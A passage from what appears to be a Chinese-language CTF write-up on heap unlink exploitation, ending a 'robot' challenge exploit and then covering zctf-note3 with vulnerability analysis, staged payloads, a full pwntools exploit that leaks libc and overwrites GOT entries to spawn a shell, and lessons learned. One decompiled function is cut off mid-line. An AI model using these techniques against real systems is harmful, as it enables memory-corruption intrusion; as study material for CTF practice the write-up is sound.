        change(1, p64(addr1))
        change(6, p64(addr2))
    def exp():
        add(2, 1)
        remove(2)
        off_by_one('\x01')
        # change fd pointer
        change(2, p64(0x0000000000603138))
        off_by_one('\x00')
        #pass the fastbin check size=0x20
        add(3, 0x20)
        #now idx2->0x603138->null
        #get malloc to -> 0x603138
        add(2, 1)
        #now 0x603138->null
        add(1)
        #whell 0x603138 , it's destructor_size
        #the size must bigger than remove(2) remove(3)'s  size
        add(6, 4)
        add(3, 7)
        #change idx6 size:1000
        change(1, p64(1000))
        ptr = 0x00000000006030E8
        payload = p64(0) + p64(0x50) + p64(ptr-0x18) + p64(ptr-0x10)
        payload = payload.ljust(0x50, 'a')
        payload += p64(0x50) #pre_size
        payload += p64(0xa0) #size
        change(6, payload)
        # unlink
        remove(3)
        payload = p64(0)*2 + 'a'*0x18 + p64(ptr)
        change(6, payload)
        #gdb.attach(io)
        write(elf.got['exit'], 0x0000000000401855)
        # change robot_wheel to 3
        write(0x603130, 3)
        change(1, p64(elf.got['puts']))
        start_robot()
        # leak 
        io.recvuntil(" Thx ")
        puts_addr = u64(io.recv(6).strip().ljust(8, '\x00'))
        io.success("puts_addr: 0x%x" % puts_addr)
        libc_base = puts_addr - libc.symbols['puts']
        system_addr = libc_base + libc.symbols['system']
        #get shell
        write(elf.got['atoi'], system_addr)
        io.send("sh;#")
    if __name__ == '__main__':
        exp()
        io.interactive()
## zctf-note3
这道题算自己做的了，自己分析漏洞点，自己做，不过有两个位置卡住了，暂时未得以解决先记录下来，从他人wp里获得的解决方案
### 功能分析
有增删查改，  
查询部分是没用的，无法泄露
### 漏洞点分析
不知道为什么，看到这个读取函数瞬间就懂怎么做了
    unsigned __int64 __fastcall sub_4008DD(__int64 a1, __int64 a2, char a3)
    {
      char v4; // [rsp+Ch] [rbp-34h]
      char buf; // [rsp+2Fh] [rbp-11h]
      unsigned __int64 i; // [rsp+30h] [rbp-10h]
      ssize_t v7; // [rsp+38h] [rbp-8h]
      v4 = a3;
      for ( i = 0LL; a2 - 1 > i; ++i )
      {
        v7 = read(0, &buf, 1uLL);
        if ( v7 >\n", "1")
        io.sendlineafter("Input the length of the note content:(less than 1024)\n", str(size))
        io.sendlineafter("Input the note content:\n", content)
    def show():
        io.sendlineafter("option--->>\n", "2")
    def edit(idx, content):
        io.sendlineafter("option--->>\n", "3")
        io.sendlineafter("Input the id of the note:\n", str(idx))
        io.sendlineafter("Input the new content:\n", content)
    def delete(idx):
        io.sendlineafter("option--->>\n", "4")
        io.sendlineafter("Input the id of the note:\n", str(idx))
不用多说吧，每道堆题一样的套路
  1. unlink部分
    add(0, 'a'*0x8) #idx0
        add(0, 'b'*0x8) #idx1
        add(0x80, 'c'*0x80) #idx2
        ptr = 0x6020c8
        payload = p64(0) + p64(0x30) + p64(ptr-0x18) + p64(ptr-0x10)
        payload = payload.ljust(0x30, 'a')
        payload += p64(0x30)
        payload += p64(0x90)
        edit(0, payload)
        delete(2)
**这里有坑，切记，不能删掉idx1在进行覆盖，会报错，至于具体报错原因我不清楚，我估计是fastbin链上修改成了错误的fd指针，检测到了，这个问题待解决**
简单的unlink
  1. 这里我利用了上一道题的思路，一样的做，修改idx0指向idx1指针部分，通过修改idx0，然后达到任意地址写
    free_got = elf.got['free']
        puts_plt = elf.plt['puts']
        puts_got = elf.got['puts']
        atol_got = elf.got['atol']
        atoi_got = elf.got['atoi']
        payload = 'a'*0x18 + p64(ptr+8) + p64(elf.got['free']) 
        #payload = 'a'*0x18 + p64(free_got) + p64(puts_got)
        edit(0, payload)
        #edit(0, p64(puts_plt)[:-1])
        edit(1, p64(elf.plt['puts'])[:-1]) #关键点，切记，不能破坏到下一个地址，不然会出错
        #delete(1)
        edit(0, p64(atol_got))
        delete(1)
        atol_addr = u64(io.recvline().strip().ljust(8, '\x00'))
        libc_base = atol_addr - libc.symbols['atol']
        system_addr = libc_base + libc.symbols['system']
        io.success("libc_base: 0x%x" % libc_base)
        io.success("atol_got: 0x%x" % atol_got)
  1. getshell
    edit(0, p64(atoi_got))
        edit(1, p64(system_addr)[:-1])
        gdb.attach(io)
        io.sendline("/bin/sh;#")
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'note3'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '127.0.0.1'
    port = 10000
    #don't forget to change it
    #ctx.binary = './' + 'note3'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = libc
    if local:
        context.log_level = 'debug'
        io = ctx.start()
        libc = ELF(libc)
    else:
        io = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
    def add(size, content):
        io.sendlineafter("option--->>\n", "1")
        io.sendlineafter("Input the length of the note content:(less than 1024)\n", str(size))
        io.sendlineafter("Input the note content:\n", content)
    def show():
        io.sendlineafter("option--->>\n", "2")
    def edit(idx, content):
        io.sendlineafter("option--->>\n", "3")
        io.sendlineafter("Input the id of the note:\n", str(idx))
        io.sendlineafter("Input the new content:\n", content)
    def delete(idx):
        io.sendlineafter("option--->>\n", "4")
        io.sendlineafter("Input the id of the note:\n", str(idx))
    def exp():
        add(0, 'a'*0x8) #idx0
        add(0, 'b'*0x8) #idx1
        add(0x80, 'c'*0x80) #idx2
        ptr = 0x6020c8
        payload = p64(0) + p64(0x30) + p64(ptr-0x18) + p64(ptr-0x10)
        payload = payload.ljust(0x30, 'a')
        payload += p64(0x30)
        payload += p64(0x90)
        edit(0, payload)
        delete(2)
        free_got = elf.got['free']
        puts_plt = elf.plt['puts']
        puts_got = elf.got['puts']
        atol_got = elf.got['atol']
        atoi_got = elf.got['atoi']
        payload = 'a'*0x18 + p64(ptr+8) + p64(elf.got['free']) 
        #payload = 'a'*0x18 + p64(free_got) + p64(puts_got)
        edit(0, payload)
        #edit(0, p64(puts_plt)[:-1])
        edit(1, p64(elf.plt['puts'])[:-1])
        #delete(1)
        edit(0, p64(atol_got))
        delete(1)
        atol_addr = u64(io.recvline().strip().ljust(8, '\x00'))
        libc_base = atol_addr - libc.symbols['atol']
        system_addr = libc_base + libc.symbols['system']
        io.success("libc_base: 0x%x" % libc_base)
        io.success("atol_got: 0x%x" % atol_got)
        edit(0, p64(atoi_got))
        edit(1, p64(system_addr)[:-1])
        gdb.attach(io)
        io.sendline("/bin/sh;#")
    if __name__ == '__main__':
        exp()
        io.interactive()
## 总结
  1. unlink部分完结了
  2. unlink部分学习时间4天，现在对于unlink轻车熟路了，不过通常不是单一漏洞点，单一的好分析点
  3. 要多学学逆向，逆向起复杂的题目来真的难，像那个机器人那题，我连漏洞点都找不到，真的惨
  4. 我觉得机器人那题还有另外解法，因为4和5选项越界部分都没用上
  5. 感谢萝卜师傅的指导
## 参考链接
[看雪大佬](https://bbs.pediy.com/thread-247007.htm)